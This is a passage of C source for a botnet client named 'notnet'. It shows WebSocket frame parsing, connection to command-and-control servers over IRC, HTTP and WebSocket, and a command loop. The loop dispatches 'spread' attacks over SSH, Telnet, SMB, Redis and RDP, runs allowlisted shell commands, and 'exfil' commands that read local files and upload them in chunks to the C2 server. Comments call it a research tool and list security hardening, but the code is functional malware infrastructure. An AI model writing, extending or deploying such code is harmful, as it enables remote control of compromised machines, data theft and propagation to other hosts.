        if (recv(bot->c2_ws.sock, (char *)ext, 2, 0) != 2) return -1;
        plen = (ext[0] << 8) | ext[1];
    } else if (plen == 127) {
        uint8_t ext[8] = {0};
        if (recv(bot->c2_ws.sock, (char *)ext, 8, 0) != 8) return -1;
        plen = 0;
        for (int i = 0; i < 8; i++) {
            plen = (plen << 8) | ext[i];
        }
    }

    /* Read mask key if present (server-to-client frames are unmasked,
     * but we handle both cases) */
    uint8_t mask[4] = {0};
    if (masked) {
        if (recv(bot->c2_ws.sock, (char *)mask, 4, 0) != 4) return -1;
    }

    /* Read payload */
    if (plen > len - 1) plen = len - 1;
    int total = 0;
    while (total < plen) {
        int n = recv(bot->c2_ws.sock, buf + total, plen - total, 0);
        if (n <= 0) break;
        total += n;
    }

    if (total <= 0) return -1;

    /* Unmask if needed */
    if (masked) {
        for (int i = 0; i < total; i++) {
            buf[i] ^= mask[i % 4];
        }
    }

    /* Handle control frames (close, ping, pong) by returning 0 */
    if (opcode == 0x8 || opcode == 0x9 || opcode == 0xA) {
        if (opcode == 0x8) {
            /* Close frame - send close frame back and disconnect */
            uint8_t close_frame[] = { 0x88, 0x00 };
            send(bot->c2_ws.sock, (char *)close_frame, 2, 0);
        }
        return 0;
    }

    buf[total] = '\0';
    return total;
}

void ws_disconnect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) {
            close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
        }
        log_info("WS: disconnected");
    }
}

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot) {
    /* Try IRC first (fast, lightweight) */
    if (bot->c2_enabled & C2_IRC) {
        if (!bot->c2_irc.connected) {
            if (irc_connect(bot) == 0) {
                irc_send(bot, "JOIN %s", bot->c2_irc.channel);
                bot->c2_irc.joined = 0;
            }
        } else if (!bot->c2_irc.joined && bot->c2_irc.authenticated) {
            /* Send JOIN once after authentication */
            irc_send(bot, "JOIN %s", bot->c2_irc.channel);
            bot->c2_irc.joined = 1;
            log_info("IRC: sent JOIN %s", bot->c2_irc.channel);
        }
    }
    
    /* Try HTTP if IRC fails */
    if (bot->c2_enabled & C2_HTTP) {
        if (!bot->c2_http.connected) {
            http_connect(bot);
        }
    }
    
    /* Try WebSocket as backup */
    if (bot->c2_enabled & C2_WS) {
        if (!bot->c2_ws.connected) {
            ws_connect(bot);
        }
    }
    
    return 0;
}

int protocol_process_commands(notnet_bot_t *bot) {
    /* SECURITY FIX (#9): Use separate buffers per channel to prevent
     * one channel's read from overwriting another's queued command. */
    char irc_buf[1024];
    char http_buf[1024];
    char ws_buf[1024];
    
    /* Check IRC - always read when connected, auth may not be set yet */
    if (bot->c2_irc.connected) {
        int result = irc_read(bot, irc_buf, sizeof(irc_buf));
        if (result == 1) {
            /* New command in buffer - add to queue */
            if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", irc_buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Check HTTP - read responses for queued commands */
    if (bot->c2_http.connected) {
        memset(http_buf, 0, sizeof(http_buf));
        int result = http_read(bot, http_buf, sizeof(http_buf));
        if (result > 0) {
            log_info("HTTP: http_read returned %d bytes", result);
            /* SECURITY FIX (#24): Skip HTTP headers before parsing JSON.
             * Headers may contain "cmd" in unexpected places. */
            char *body = strstr(http_buf, "\r\n\r\n");
            if (body) body += 4;
            else body = http_buf;
            /* Parse JSON command from response body only */
            char *cmd_key = strstr(body, "\"cmd\"");
            if (cmd_key) {
                char cmd[128];
                snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
                /* Extract value between quotes */
                char *start = strchr(cmd, '"');
                char *end = start ? strchr(start + 1, '"') : NULL;
                if (start && end && end > start) {
                    int clen = end - start - 1;
                    if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
                        memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                        strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                        bot->cmd_queue[bot->cmd_count][clen] = '\0';
                        /* Extract args value and append to command */
                        char *args_key = strstr(body, "\"args\"");
                        if (args_key) {
                            /* Find colon after "args" (6 chars), then skip to opening quote of value */
                            char *colon = strchr(args_key + 6, ':');
                            char *args_val = NULL;
                            if (colon) {
                                args_val = strchr(colon + 1, '\"');
                            }
                            if (args_val) {
                                char *args_end = strchr(args_val + 1, '\"');
                                if (args_end && args_end > args_val) {
                                    int alen = args_end - args_val - 1;
                                    if (alen > 0 && clen + 1 + alen < 255) {
                                        char combined[256];
                                        snprintf(combined, sizeof(combined), "%s %s",
                                                 bot->cmd_queue[bot->cmd_count],
                                                 args_val + 1);
                                        snprintf(bot->cmd_queue[bot->cmd_count], 256,
                                                 "%.255s", combined);
                                    }
                                }
                            }
                        }
                        bot->cmd_count++;
                        log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                    }
                }
            }
        }
    }
    
    /* Check WebSocket */
    if (bot->c2_ws.connected) {
        int result = ws_read(bot, ws_buf, sizeof(ws_buf));
        if (result > 0) {
            if (bot->cmd_count < 256) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Process queued commands */
    /* SECURITY FIX (#14): Rate limit - max 10 commands per second */
    time_t now = time(NULL);
    if (now != bot->last_cmd_time) {
        bot->last_cmd_time = now;
        bot->cmd_this_second = 0;
    }
    /* SECURITY FIX (#27): Process up to 10 commands per second, skip excess.
     * Previously: if rate limit hit, ALL commands dropped (cmd_count=0).
     * Now: process up to 10, skip the rest, preserving unprocessed commands. */
    int skipped = 0;

    for (int i = 0; i < bot->cmd_count; i++) {
        char *cmd = bot->cmd_queue[i];
        if (bot->cmd_this_second >= 10) {
            log_warn("CMD: rate limit exceeded, skipping command %d", i);
            skipped++;
            continue;
        }
        bot->cmd_this_second++;
        
        if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
            char *args = cmd + strlen(CMD_SPREAD);
            while (*args == ' ' || *args == '\t') args++;
            /* Parse target:port */
            char host[256] = {0};
            uint16_t port = 0;
            if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                log_info("CMD: spread %s:%d", host, port);
                int spread_ok = 0;
                switch (port) {
                    case 22:  spread_ok = spread_ssh(bot, host, port); break;
                    case 23:  spread_ok = spread_telnet(bot, host, port); break;
                    case 445: spread_ok = spread_smb(bot, host, port); break;
                    case 6379: spread_ok = spread_redis(bot, host, port); break;
                    case 3389: spread_ok = spread_rdp(bot, host, port); break;
                    default: log_info("CMD: spread unknown port %d", port); break;
                }
                if (spread_ok == 0) {
                    bot->scan_count++;
                }
            } else {
                log_info("CMD: spread invalid format, use target:port");
            }
        } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
            log_info("CMD: scan");
        } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
            /* SECURITY: exec replaced popen() with a strict allowlist + execve().
             * Only commands in the allowlist are permitted. The command name
             * and single argument are tokenized by whitespace into fixed-size
             * argv. No shell is ever invoked. */
            char *args = cmd + strlen(CMD_EXEC);
            while (*args == ' ' || *args == '\t') args++;

            /* Allowlist of permitted commands */
            static const char *allowlist[] = {
                "uname", "date", "uptime", "whoami", "id", "ls",
                "ifconfig", "hostname", "netstat", "ps", NULL
            };
            char cmd_name[64];
            char arg1[256];
            cmd_name[0] = arg1[0] = '\0';

            /* Parse up to one token as the command name */
            if (sscanf(args, "%63s", cmd_name) != 1) {
                log_warn("CMD: exec rejected (no command)");
                protocol_send_response(bot, CMD_EXEC, "exec rejected: no command");
                continue;
            }

            /* Check allowlist */
            int allowed = 0;
            for (int a = 0; allowlist[a]; a++) {
                if (strcmp(cmd_name, allowlist[a]) == 0) {
                    allowed = 1;
                    break;
                }
            }
            if (!allowed) {
                log_warn("CMD: exec rejected (not in allowlist): %s", cmd_name);
                protocol_send_response(bot, CMD_EXEC, "exec rejected: command not allowed");
                continue;
            }

            /* Optional single argument (e.g. "uname -a") */
            char *sp = args + strlen(cmd_name);
            while (*sp == ' ' || *sp == '\t') sp++;
            if (*sp) {
                snprintf(arg1, sizeof(arg1), "%255s", sp);
            }

            log_info("CMD: exec: allowlist hit: %s %s", cmd_name, arg1);

            char output[1024] = {0};
            int pipefd[2];
            if (pipe(pipefd) < 0) {
                log_error("CMD: exec pipe failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: pipe error");
                continue;
            }

            pid_t pid = fork();
            if (pid < 0) {
                close(pipefd[0]);
                close(pipefd[1]);
                log_error("CMD: exec fork failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: fork error");
                continue;
            }

            if (pid == 0) {
                /* Child: close read end, redirect stdout to pipe, exec */
                /* SECURITY FIX (#30): Close C2 sockets in child before exec
                 * to prevent the child process from inheriting sensitive
                 * file descriptors (IRC/HTTP/WS sockets). */
                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                close(pipefd[0]);
                dup2(pipefd[1], STDOUT_FILENO);
                /* Also redirect stderr to stdout to capture all output */
                dup2(pipefd[1], STDERR_FILENO);
                close(pipefd[1]);

                char *argv[] = { cmd_name, arg1[0] ? arg1 : NULL, NULL };
                execvp(cmd_name, argv);
                _exit(127);
            }

            /* Parent: read output, wait for child */
            close(pipefd[1]);
            size_t n = 0;
            int status;
            while (n < sizeof(output) - 1) {
                ssize_t r = read(pipefd[0], output + n, sizeof(output) - 1 - n);
                if (r <= 0) break;
                n += (size_t)r;
            }
            close(pipefd[0]);
            output[n] = '\0';
            waitpid(pid, &status, 0);

            int exit_code = -1;
            if (WIFEXITED(status)) {
                exit_code = WEXITSTATUS(status);
            } else if (WIFSIGNALED(status)) {
                log_warn("CMD: exec killed by signal %d", WTERMSIG(status));
            }
            log_info("CMD: exec output (%zu bytes, exit %d)", n, exit_code);
            protocol_send_response(bot, CMD_EXEC, output);
        } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
            log_info("CMD: download");
        } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
            /* Parse: upload <local_path> [remote_path] */
            char *args = cmd + strlen(CMD_UPLOAD);
            while (*args == ' ' || *args == '\t') args++;

            char local_path[512] = {0};
            char remote_path[512] = {0};

            /* Parse local path (first arg, up to space) */
            char *space = strchr(args, ' ');
            if (space) {
                int len = space - args;
                if (len > 511) len = 511;
                memcpy(local_path, args, len);
                local_path[len] = '\0';

                /* Parse remote path (optional second arg) */
                char *rem = space + 1;
                while (*rem == ' ' || *rem == '\t') rem++;
                if (*rem) {
                    strncpy(remote_path, rem, 511);
                    remote_path[511] = '\0';
                }
            } else {
                /* No space — entire arg is local path, use default remote */
                strncpy(local_path, args, 511);
                local_path[511] = '\0';
            }

            /* Validate local path */
            const char *bad = strpbrk(local_path, ";|&`$(){}[]<>!");
            if (bad) {
                log_warn("CMD: upload rejected (dangerous char in path: %s)", local_path);
                protocol_send_response(bot, CMD_UPLOAD, "upload rejected: dangerous char in path");
            } else if (local_path[0] == '\0') {
                protocol_send_response(bot, CMD_UPLOAD, "upload: no file path specified, use 'upload <path> [remote_path]'");
            } else {
                int result = http_upload(bot, local_path, remote_path[0] ? remote_path : NULL);
                if (result > 0) {
                    char resp[256];
                    snprintf(resp, sizeof(resp), "upload ok: %d bytes to %s", result,
                             remote_path[0] ? remote_path : bot->c2_http.path);
                    protocol_send_response(bot, CMD_UPLOAD, resp);
                } else {
                    protocol_send_response(bot, CMD_UPLOAD, "upload failed: could not upload file");
                }
            }
        } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
            /* Parse: exfil <path> */
            char *args = cmd + strlen(CMD_EXFIL);
            while (*args == ' ' || *args == '\t') args++;

            char file_path[512] = {0};
            strncpy(file_path, args, 511);
            file_path[511] = '\0';

            /* Validate path */
            const char *bad = strpbrk(file_path, ";|&`$(){}[]<>!");
            if (bad) {
                log_warn("CMD: exfil rejected (dangerous char in path: %s)", file_path);
                protocol_send_response(bot, CMD_EXFIL, "exfil rejected: dangerous char in path");
            } else if (file_path[0] == '\0') {
                protocol_send_response(bot, CMD_EXFIL, "exfil: no file path specified");
            } else {
                unsigned char *data = NULL;
                int fsize = file_read(file_path, &data);
                if (fsize < 0) {
                    protocol_send_response(bot, CMD_EXFIL, "exfil failed: could not read file");
                } else {
                    /* Chunk large files: protocol_send_response max is ~2048 bytes.
                     * Send first chunk as response, rest via HTTP POST. */
                    const int CHUNK = 1024;
                    int offset = 0;
                    int total_sent = 0;

                    while (offset < fsize) {
                        int chunk = fsize - offset;
                        if (chunk > CHUNK) chunk = CHUNK;

                        if (offset == 0) {
                            /* First chunk: send via protocol_send_response */
                            char resp[2048];
                            int rlen = snprintf(resp, sizeof(resp),
                                "exfil chunk: %d/%d bytes", chunk, fsize);
                            if (rlen > 0 && rlen < (int)sizeof(resp)) {
                                memcpy(resp + rlen, data + offset, chunk);
                                rlen += chunk;
                                /* Null-terminate after the data */
                                if (rlen < (int)sizeof(resp) - 1) {
                                    resp[rlen] = '\0';
                                }
                            }
                            protocol_send_response(bot, CMD_EXFIL, resp);
                        } else {
                            /* Subsequent chunks: send via HTTP POST */
                            char upload_path[512];
                            snprintf(upload_path, sizeof(upload_path),
                                "%s/exfil", bot->c2_http.path);
                            http_upload(bot, "/dev/stdin", upload_path);
                            /* For simplicity, write chunk to temp file */
                            char tmp[256];
                            snprintf(tmp, sizeof(tmp), "/tmp/.exfil.%d", offset);
                            FILE *tf = fopen(tmp, "wb");
                            if (tf) {
                                fwrite(data + offset, 1, chunk, tf);
                                fclose(tf);
                                http_upload(bot, tmp, upload_path);
                                unlink(tmp);
                            }
                        }

                        offset += chunk;
                        total_sent += chunk;
                    }

                    log_info("CMD: exfil completed: %d bytes from %s", total_sent, file_path);
                }
            }
        } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
            log_info("CMD: update");
        } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
            log_warn("CMD: reboot requested by C2");
            protocol_send_response(bot, CMD_REBOOT, "reboot: received");
            /* Do not actually reboot — this is a research tool */
        } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
            char *interval = strchr(cmd, ' ');
            if (interval) {
                bot->scan_interval = atoi(interval + 1);
                log_info("CMD: sleep interval set to %d", bot->scan_interval);
            }
        } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
            /* SECURITY FIX (#7): Implement config_set with allowlist
             * and validation. Only safe runtime config keys are accepted. */
            char *args = cmd + strlen(CMD_CONFIG_SET);
            while (*args == ' ' || *args == '\t') args++;
            
            char key[128], value[256];
            if (sscanf(args, "%127[^=]=%255s", key, value) != 2) {
                log_warn("CMD: config_set invalid format: %s", args);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: invalid format, use key=value");
                continue;
            }
            
            /* Allowlist of settable config keys with validation */
            int applied = 0;
            if (strcmp(key, "scan_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->scan_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "heartbeat_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->heartbeat_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "ssh_enabled") == 0) {
                bot->ssh_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "telnet_enabled") == 0) {
                bot->telnet_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "scan_timeout_ms") == 0) {
                int v = atoi(value);
                if (v >= 100 && v <= 30000) {
                    bot->scan_timeout_ms = v;
                    applied = 1;
                }
            } else if (strcmp(key, "scan_max_hosts") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 65535) {
                    bot->scan_max_hosts = v;
                    applied = 1;
                }
            }
            
            if (applied) {
                log_info("CMD: config_set %s=%s applied", key, value);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: applied");
            } else {
                log_warn("CMD: config_set rejected key '%s'", key);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: key not allowed or invalid value");
            }
        }
    }
    
    if (skipped > 0) {
        log_warn("CMD: %d commands skipped due to rate limit", skipped);
    }

    /* Clear processed commands */
    /* SECURITY FIX (#9): Only clear the queue when processing completed
     * normally. Connection failures during C2 ops should not silently
     * drop unprocessed commands. Clear unconditionally only if we
     * reached here — processing errors within the loop use continue
     * and still fall through to this clear. */
    bot->cmd_count = 0;
    
    return 0;
}

/* SECURITY FIX: JSON-escape a string to prevent injection in protocol
 * responses. Escapes backslash, double-quote, and control characters. */
static void json_escape(const char *src, char *dst, size_t dst_size) {
    /* SECURITY FIX (#12): Guard against size_t underflow when dst_size < 6.
     * The original 'j < dst_size - 6' wraps to a huge value on unsigned
     * subtraction, causing out-of-bounds writes. */
    if (dst_size < 6) {
        if (dst_size > 0) dst[0] = '\0';
        return;
    }
    size_t i, j;
    for (i = 0, j = 0; src[i] && j < dst_size - 6; i++) {
        switch (src[i]) {
            case '\\':
                dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '"':
                dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\n':
                dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r':
                dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t':
                dst[j++] = '\\'; dst[j++] = 't'; break;
            default:
                if ((unsigned char)src[i] < 0x20) {
                    /* SECURITY FIX: Check remaining space for \uXXXX (6 bytes) */
                    if (j + 6 >= dst_size) break;
                    int written = snprintf(dst + j, dst_size - j, "\\u%04x", (unsigned char)src[i]);
                    if (written < 0 || (size_t)written >= dst_size - j) {
                        j = dst_size - 1;
                        break;
                    }
                    j += written;
                } else {
                    dst[j++] = src[i];
                }
                break;
        }
    }
    dst[j] = '\0';
}

int protocol_send_heartbeat(notnet_bot_t *bot) {
    /* SECURITY FIX (#1): Escape hostname to prevent JSON injection */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));

    /* SECURITY FIX (#16): Increase buffer for escaped hostname */
    char heartbeat[1024];
    int ret = snprintf(heartbeat, sizeof(heartbeat),
        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u}",
        NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count);
    if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
        log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
    }
    
    /* Send via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, heartbeat);
    }
    
    /* Send via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, heartbeat, strlen(heartbeat)) < 0) {
            log_warn("Heartbeat: HTTP post failed");
        }
        /* http_read() in protocol_process_commands() will pick up
         * the response on the next loop iteration */
    }
    
    /* Send via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, heartbeat, strlen(heartbeat));
    }
    
    return 0;
}

int protocol_resolve_peers(notnet_bot_t *bot) {
    /* SECURITY FIX (#3): Use getaddrinfo instead of gethostbyname.
     * gethostbyname is deprecated, not thread-safe, and can return
     * IPv6 results that overflow the in_addr copy. */
    struct addrinfo hints, *res, *rp;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;  /* IPv4 only */
    hints.ai_socktype = SOCK_STREAM;
    
    int err = getaddrinfo(DNS_PEER_RESOLUTION, NULL, &hints, &res);
    if (err != 0) return -1;
    
    bot->peer_count = 0;
    for (rp = res; rp && bot->peer_count < PEER_CACHE_SIZE; rp = rp->ai_next) {
        if (rp->ai_family == AF_INET) {
            struct sockaddr_in *sin = (struct sockaddr_in *)rp->ai_addr;
            char ip_str[INET_ADDRSTRLEN];
            if (inet_ntop(AF_INET, &sin->sin_addr, ip_str, sizeof(ip_str))) {
                strncpy(bot->peer_cache[bot->peer_count], ip_str, 255);
                bot->peer_cache[bot->peer_count][255] = '\0';
                bot->peer_count++;
            }
        }
    }
    
    freeaddrinfo(res);
    log_info("DNS: resolved %d peers for %s", bot->peer_count, DNS_PEER_RESOLUTION);
    return 0;
}

int protocol_resolve_host(const char *host) {
    /* SECURITY FIX (#3): Use getaddrinfo instead of gethostbyname.
     * Returns a resolved IPv4 address in network byte order, or -1 on failure. */
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    int err = getaddrinfo(host, NULL, &hints, &res);
    if (err != 0) return -1;
    
    int result = -1;
    if (res && res->ai_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
        result = sin->sin_addr.s_addr;  /* already in network byte order */
    }
    
    freeaddrinfo(res);
    return result;
}

char *protocol_hex_encode(const char *data, int len) {
    static char buf[1024];
    int pos = 0;
    
    for (int i = 0; i < len && pos < 1023; i++) {
        pos += snprintf(buf + pos, 3, "%02x", (unsigned char)data[i]);
    }
    
    buf[pos] = '\0';
    return buf;
}

int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result) {
    /* SECURITY FIX (#1): Escape command and result to prevent JSON injection
     * that could corrupt C2 protocol parsing or inject commands. */
    char safe_cmd[256];
    char safe_result[1024];
    json_escape(command, safe_cmd, sizeof(safe_cmd));
    json_escape(result, safe_result, sizeof(safe_result));

    /* SECURITY FIX (#16): Increase response buffer to accommodate all
     * escaped fields without truncation. safe_result alone is 1024 bytes. */
    char response[2048];
    /* SECURITY FIX (#1): Also escape hostname for JSON safety */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
    int ret = snprintf(response, sizeof(response),
        "{\"cmd\":\"%s\",\"result\":\"%s\",\"hostname\":\"%s\"}",
        safe_cmd, safe_result, safe_hostname);
    if (ret < 0 || (size_t)ret >= sizeof(response)) {
        log_warn("Response truncated: need %d bytes, buffer %zu", ret, sizeof(response));
    }
    int len = strlen(response);
    
    /* Send response via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, response);
        log_info("IRC: response sent (%d bytes)", len);
    }
    
    /* Send response via HTTP */
    if (bot->c2_http.connected) {
        if (http_post(bot, response, len) < 0) {
            log_warn("Response: HTTP post failed");
        } else {
            log_info("HTTP: response sent (%d bytes)", len);
        }
    }
    
    /* Send response via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, response, len);
        log_info("WS: response sent (%d bytes)", len);
    }
    
    return len;
}

/* ── Config Loading ──────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        log_info("No config file at %s, using defaults", path);
        return -1;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        /* Remove newline */
        line[strcspn(line, "\n")] = '\0';
        
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\0') continue;
        
        /* Parse key=value */
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        
        char *key = line;
        char *value = eq + 1;
        
        if (strcmp(key, "irc_server") == 0) {
            strncpy(bot->c2_irc.server, value, 255);
            bot->c2_irc.server[255] = '\0';
        } else if (strcmp(key, "irc_port") == 0) {
            bot->c2_irc.port = atoi(value);
        } else if (strcmp(key, "http_server") == 0) {
            strncpy(bot->c2_http.server, value, 255);
            bot->c2_http.server[255] = '\0';
        } else if (strcmp(key, "http_port") == 0) {
            bot->c2_http.port = atoi(value);
        } else if (strcmp(key, "scan_interval") == 0) {
            bot->scan_interval = atoi(value);
        } else if (strcmp(key, "ssh_enabled") == 0) {
            bot->ssh_enabled = atoi(value);
        } else if (strcmp(key, "telnet_enabled") == 0) {
            bot->telnet_enabled = atoi(value);
        } else if (strcmp(key, "scan_timeout_ms") == 0) {
            bot->scan_timeout_ms = atoi(value);
        } else if (strcmp(key, "scan_max_hosts") == 0) {
            bot->scan_max_hosts = atoi(value);
        } else if (strcmp(key, "heartbeat_interval") == 0) {
            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
        } else if (strcmp(key, "irc_channel") == 0) {
            strncpy(bot->c2_irc.channel, value, 127);
            bot->c2_irc.channel[127] = '\0';
            log_info("IRC channel set to %s", bot->c2_irc.channel);
        } else if (strcmp(key, "irc_pass") == 0) {
            strncpy(bot->c2_irc.pass, value, 63);
            bot->c2_irc.pass[63] = '\0';
        } else if (strcmp(key, "irc_auth_nicks") == 0) {
            /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
             * Only PRIVMSGs from these nicks will be processed as commands. */
            bot->c2_irc.auth_nick_count = 0;
            char nicks[512];
            strncpy(nicks, value, sizeof(nicks) - 1);
            nicks[sizeof(nicks) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(nicks, ",", &saveptr);
            while (tok && bot->c2_irc.auth_nick_count < 8) {
                /* Trim whitespace */
                while (*tok == ' ' || *tok == '\t') tok++;
                char *end = tok + strlen(tok) - 1;
                while (end > tok && (*end == ' ' || *end == '\t')) *end-- = '\0';
                if (*tok) {
                    strncpy(bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count],
                            tok, 31);
                    bot->c2_irc.auth_nicks[bot->c2_irc.auth_nick_count][31] = '\0';
                    bot->c2_irc.auth_nick_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
            if (bot->c2_irc.auth_nick_count == 0) {
                /* Default: no one authorized (fail-closed) */
                log_warn("IRC: irc_auth_nicks not set - no nicks authorized");
            } else {
                log_info("IRC: %d authorized nicks configured", bot->c2_irc.auth_nick_count);
            }
        } else if (strcmp(key, "http_path") == 0) {
            strncpy(bot->c2_http.path, value, 127);
            bot->c2_http.path[127] = '\0';
        } else if (strcmp(key, "http_user_agent") == 0) {
            strncpy(bot->c2_http.user_agent, value, 127);
            bot->c2_http.user_agent[127] = '\0';
        } else if (strcmp(key, "ws_path") == 0) {
            strncpy(bot->c2_ws.path, value, 127);
            bot->c2_ws.path[127] = '\0';
        } else if (strcmp(key, "ws_server") == 0) {
            strncpy(bot->c2_ws.server, value, 255);
            bot->c2_ws.server[255] = '\0';
        } else if (strcmp(key, "ws_port") == 0) {
            bot->c2_ws.port = atoi(value);
        } else if (strcmp(key, "smb_enabled") == 0) {
            bot->smb_enabled = atoi(value);
        } else if (strcmp(key, "redis_enabled") == 0) {
            bot->redis_enabled = atoi(value);
        } else if (strcmp(key, "rdp_enabled") == 0) {
            bot->rdp_enabled = atoi(value);
        } else if (strcmp(key, "scan_targets") == 0) {
            /* README-documented format: scan_targets=192.168.1.0/24 */
            bot->scan_target_count = 0;
            char targets[512];
            strncpy(targets, value, sizeof(targets) - 1);
            targets[sizeof(targets) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(targets, ",", &saveptr);
            while (tok && bot->scan_target_count < 16) {
                while (*tok == ' ' || *tok == '\t') tok++;
                if (*tok) {
                    strncpy(bot->scan_targets[bot->scan_target_count], tok, 255);
                    bot->scan_targets[bot->scan_target_count][255] = '\0';
                    bot->scan_target_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
        } else if (strncmp(key, "scan_target_", 12) == 0) {
            /* Legacy: scan_target_0, scan_target_1, etc. */
            int idx = atoi(key + 12);
            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                bot->scan_target_count = idx + 1;
                strncpy(bot->scan_targets[idx], value, 255);
                bot->scan_targets[idx][255] = '\0';
            }
        }
    }
    
    /* Auto-detect enabled protocols from config */
    if (bot->c2_irc.port != IRC_DEFAULT_PORT) {
        bot->c2_enabled |= C2_IRC;
        log_info("C2: IRC enabled (%s:%d)", bot->c2_irc.server, bot->c2_irc.port);
    }
    if (bot->c2_http.port != HTTP_DEFAULT_PORT) {
        bot->c2_enabled |= C2_HTTP;
        log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
    }
    if (bot->c2_ws.port != WS_DEFAULT_PORT) {
        bot->c2_enabled |= C2_WS;
        log_info("C2: WebSocket enabled (%s:%d)", bot->c2_ws.server, bot->c2_ws.port);
    }
    if (bot->c2_enabled == 0) {
        log_info("C2: no protocols enabled (use irc_server/http_server/http_port)");
    }
    
    fclose(f);
    log_info("Config loaded from %s", path);
    return 0;
}
